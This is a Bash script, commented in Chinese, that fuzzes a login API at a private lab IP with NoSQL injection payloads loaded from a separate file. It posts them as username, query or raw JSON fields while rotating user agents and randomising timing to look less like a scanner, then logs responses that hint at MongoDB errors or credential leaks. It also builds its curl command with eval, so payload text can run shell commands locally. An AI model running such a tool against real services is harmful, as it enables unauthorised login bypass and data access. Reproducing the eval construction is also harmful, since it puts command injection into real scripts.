#!/bin/bash

# NoSQL注入测试脚本
# 使用NoSQL.txt中的载荷通过HTTP POST发送

# 配置参数
TARGET_URL="https://192.168.139.141/api/login"  # 目标URL
DURATION=300                # 测试持续时间(秒)
BASE_RATE=3                 # 基础请求速率(请求/秒)
LOG_FILE="nosql_fuzz_$(date +%Y%m%d_%H%M%S).log"
PAYLOAD_FILE="NoSQL.txt"

# 用户代理列表
USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
  "curl/7.68.0"
)

# 请求头列表
CONTENT_TYPES=(
  "application/json"
  "application/x-www-form-urlencoded"
  "text/plain"
)

# 检查载荷文件是否存在
if [ ! -f "$PAYLOAD_FILE" ]; then
  echo "错误: 载荷文件 $PAYLOAD_FILE 不存在!"
  exit 1
fi

# 读取载荷文件
mapfile -t PAYLOADS < "$PAYLOAD_FILE"

# 初始化日志文件
echo "NoSQL注入测试报告 - $(date)" > $LOG_FILE
echo "目标URL: $TARGET_URL" >> $LOG_FILE
echo "载荷文件: $PAYLOAD_FILE" >> $LOG_FILE
echo "开始时间: $(date +%T)" >> $LOG_FILE
echo "----------------------------------------" >> $LOG_FILE

# 主扫描函数
start_scan() {
  local start_time=$(date +%s)
  local end_time=$((start_time + DURATION))
  local current_time=$(date +%s)
  local request_count=0
  
  while [ $current_time -lt $end_time ]; do
    # 随机选择载荷、用户代理和内容类型
    local random_payload=${PAYLOADS[$RANDOM % ${#PAYLOADS[@]}]}
    local user_agent=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
    local content_type=${CONTENT_TYPES[$RANDOM % ${#CONTENT_TYPES[@]}]}
    
    # 随机请求速率(基础速率±2)
    local current_rate=$((BASE_RATE + (RANDOM % 5) - 2))
    [ $current_rate -lt 1 ] && current_rate=1
    
    # 构建请求数据
    local request_data=""
    local extra_headers=""
    
    case "$content_type" in
      "application/json")
        # JSON格式请求
        case $((RANDOM % 3)) in
          0) # 作为用户名参数
            request_data="{\"username\":\"$random_payload\",\"password\":\"test123\"}"
            ;;
          1) # 作为查询参数
            request_data="{\"query\":\"$random_payload\"}"
            ;;
          2) # 直接作为JSON对象
            request_data="$random_payload"
            ;;
        esac
        extra_headers="-H 'Accept: application/json'"
        ;;
        
      "application/x-www-form-urlencoded")
        # URL编码表单格式
        case $((RANDOM % 2)) in
          0) # 作为用户名参数
            request_data="username=$random_payload&password=test123"
            ;;
          1) # 作为查询参数
            request_data="query=$random_payload"
            ;;
        esac
        ;;
        
      "text/plain")
        # 纯文本格式
        request_data="$random_payload"
        ;;
    esac
    
    # 发送请求
    echo "[$(date +%T)] 测试 #$((++request_count)): [${content_type}] ${request_data:0:60}..." | tee -a $LOG_FILE
    
    # 使用eval处理可能包含特殊字符的payload
    eval "curl -X POST -s -k -v --http3\
      -A \"$user_agent\" \
      -H \"Content-Type: $content_type\" \
      $extra_headers \
      -d \"$request_data\" \
      \"$TARGET_URL\" 2>&1" | grep -E '^< HTTP|error|invalid|syntax|not found|credentials|MongoDB|NoSQL|true|false|null|undefined|exception|timeout|500|200' >> $LOG_FILE
    
    # 随机延迟控制速率
    sleep $(awk "BEGIN {print (1/$current_rate) + (($RANDOM%1000)/3000)}")
    
    current_time=$(date +%s)
  done
  
  echo "----------------------------------------" >> $LOG_FILE
  echo "扫描完成" >> $LOG_FILE
  echo "总请求数: $request_count" >> $LOG_FILE
  echo "平均速率: $((request_count / DURATION)) 请求/秒" >> $LOG_FILE
}

# 执行扫描
start_scan

# 结果摘要
echo -e "\n扫描结果摘要:"
grep -i "error\|invalid\|syntax\|credentials\|MongoDB\|NoSQL\|true\|false\|null\|undefined\|exception\|timeout\|500\|200" $LOG_FILE | sort | uniq -c | sort -nr
